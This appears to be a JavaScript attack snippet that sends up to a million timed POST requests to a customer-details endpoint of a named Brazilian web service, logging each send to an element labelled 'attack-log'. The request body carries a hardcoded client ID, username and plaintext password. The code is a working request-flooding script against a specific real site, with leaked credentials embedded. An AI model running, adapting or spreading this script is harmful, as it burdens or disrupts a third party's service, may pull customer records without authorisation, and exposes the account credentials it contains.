function requisitionForEvery2Sec() {
  let qtdOfRequisitionSend = [];

  for (let i = 1; i <= 1000000; i++) {
    setTimeout(() => {
      const xhr = new XMLHttpRequest();
      xhr.open("POST", "https://quitei.com.br/easycollectorws/easycollectorws.asmx/ConsultarClienteDetalhes", true);
      xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      qtdOfRequisitionSend.push("---- requisicao enviada " + i + " vezes ----");
      document.getElementById("attack-log").innerHTML = qtdOfRequisitionSend;
      xhr.send("idCliente=7468454&logonUsuario=kitei.ws&senhaUsuario=Kitei123Ws");
    }, i * 2000);
  }
}
